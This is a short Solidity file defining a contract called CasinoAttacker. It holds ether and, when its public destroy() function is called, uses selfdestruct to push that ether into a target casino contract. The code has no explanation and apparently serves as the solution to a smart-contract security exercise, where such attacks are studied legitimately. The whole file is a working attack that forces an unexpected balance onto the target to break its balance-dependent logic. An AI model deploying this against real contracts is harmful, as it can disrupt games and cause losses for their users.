// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract CasinoAttacker {
    address payable private casino;

    constructor(address _casino) payable {
        casino = payable(_casino);
    }

    function destroy() public {
        selfdestruct(casino);
    }

    receive() external payable {}
}
